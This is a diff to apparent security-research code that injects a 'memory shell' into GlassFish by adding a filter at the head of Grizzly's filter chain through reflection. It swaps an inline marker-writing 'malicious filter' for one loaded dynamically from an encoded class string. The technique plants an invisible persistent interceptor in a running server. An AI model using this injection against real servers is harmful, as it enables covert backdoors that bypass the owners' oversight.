@@ -7,10 +7,12 @@ import org.apache.catalina.connector.RequestFacade;
 import org.apache.catalina.core.RequestFacadeHelper;
 import org.glassfish.grizzly.Context;
 import org.glassfish.grizzly.EmptyCompletionHandler;
-import org.glassfish.grizzly.filterchain.*;
+import org.glassfish.grizzly.filterchain.Filter;
+import org.glassfish.grizzly.filterchain.FilterChainEvent;
+import org.glassfish.grizzly.filterchain.ListFacadeFilterChain;
+import org.glassfish.grizzly.filterchain.TransportFilter;
 import org.glassfish.grizzly.http.server.AfterServiceListener;
 import org.glassfish.grizzly.http.server.Request;
-import org.glassfish.grizzly.nio.transport.TCPNIOConnection;
 
 import javax.servlet.ServletException;
 import javax.servlet.http.HttpServlet;
@@ -18,10 +20,8 @@ import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 import java.lang.reflect.Field;
-import java.lang.reflect.Method;
-import java.nio.ByteBuffer;
-import java.nio.channels.SelectableChannel;
-import java.nio.charset.StandardCharsets;
+
+import static org.su18.memshell.test.glassfish.DynamicUtils.GRIZZLY_CLASS_STRING;
 
 /**
  * 使用 Grizzly 的 Filter 写入内存马
@@ -89,7 +89,7 @@ public class AddGlassFishServiceList extends HttpServlet {
 				}
 
 				// 将我们的 filter 放在第一位
-				filterChain.add(0, new TestFilter());
+				filterChain.add(0, (Filter) DynamicUtils.getClass(GRIZZLY_CLASS_STRING).newInstance());
 
 			} catch (Exception ignored) {
 
@@ -97,28 +97,6 @@ public class AddGlassFishServiceList extends HttpServlet {
 		}
 	}
 
-	/**
-	 * 自定义恶意 Filter，在读取时触发逻辑
-	 */
-	public static class TestFilter extends BaseFilter {
-
-		@Override
-		public NextAction handleRead(FilterChainContext ctx) throws IOException {
-			TCPNIOConnection  connection = (TCPNIOConnection) ctx.getCloseable();
-			SelectableChannel channel    = connection.getChannel();
-
-			try {
-				Class<?> c = Class.forName("sun.nio.ch.SocketChannelImpl");
-				Method   m = c.getDeclaredMethod("write", ByteBuffer.class);
-				m.setAccessible(true);
-				m.invoke(channel, ByteBuffer.wrap("HTTP/1.1 200 OK su18 yyds".getBytes(StandardCharsets.UTF_8)));
-
-			} catch (Exception ignored) {
-
-			}
-			return super.handleRead(ctx);
-		}
-	}
 
 }
 
